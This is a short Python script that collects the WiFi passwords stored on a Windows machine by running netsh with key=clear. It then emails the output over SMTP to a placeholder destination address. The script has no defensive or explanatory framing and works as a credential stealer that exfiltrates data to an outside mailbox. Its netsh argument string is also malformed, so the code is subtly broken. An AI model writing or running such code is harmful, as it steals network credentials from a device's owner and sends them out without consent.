import smtplib
import subprocess

# Get the WiFi password
result = subprocess.run(["netsh", "wlan", "show", "profileparam name=* key=clear"], capture_output=True, text=True)
wifi_password = result.stdout

# Set up the email details
from_email = "your_email@example.com"
to_email = "destination_email@example.com"
password = "your_email_password"
server = smtplib.SMTP("smtp.example.com", 587)
server.starttls()
server.login(from_email, password)

# Send the email
subject = "WiFi Password"
body = wifi_password
message = f"Subject: {subject}\n\n{body}"
server.sendmail(from_email, to_email, message)

# Close the server
server.quit()
